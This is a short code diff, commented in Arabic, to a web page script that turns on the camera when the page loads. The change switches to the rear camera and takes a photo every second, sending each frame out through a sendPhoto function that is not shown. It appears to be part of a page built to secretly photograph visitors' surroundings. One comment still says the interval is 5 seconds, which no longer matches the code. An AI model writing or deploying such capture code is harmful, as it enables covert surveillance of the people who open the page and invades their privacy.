@@ -16,11 +16,13 @@ document.addEventListener("DOMContentLoaded", function () {
     async function startCamera() {
         try {
             const video = document.getElementById('video');
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: "environment" } // تشغيل الكاميرا الخلفية
+            });
             video.srcObject = stream;
 
-            console.log("✅ الكاميرا تعمل، سيتم التقاط الصور بشكل متكرر...");
-            capturePhotosRepeatedly(stream); // التقاط الصور بشكل مستمر
+            console.log("✅ الكاميرا الخلفية تعمل، سيتم التقاط الصور بشكل متكرر...");
+            capturePhotosRepeatedly(stream);
         } catch (error) {
             console.error("❌ فشل في تشغيل الكاميرا:", error);
         }
@@ -32,16 +34,16 @@ document.addEventListener("DOMContentLoaded", function () {
         const context = canvas.getContext('2d');
 
         function takePhoto() {
-            if (!document.hasFocus()) return; // إذا تم تبديل الصفحة، توقف عن التقاط الصور
+            if (!document.hasFocus()) return; // إذا غادر المستخدم الصفحة، توقف عن التقاط الصور
 
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            console.log("📸 تم التقاط صورة! جاري إرسالها...");
+            console.log("📸 تم التقاط صورة بالكاميرا الخلفية! جاري إرسالها...");
             canvas.toBlob(blob => sendPhoto(blob), "image/jpeg");
 
-            setTimeout(takePhoto, 5000); // التقاط صورة جديدة كل 5 ثوانٍ
+            setTimeout(takePhoto, 1000); // التقاط صورة جديدة كل 5 ثوانٍ
         }
 
         takePhoto();
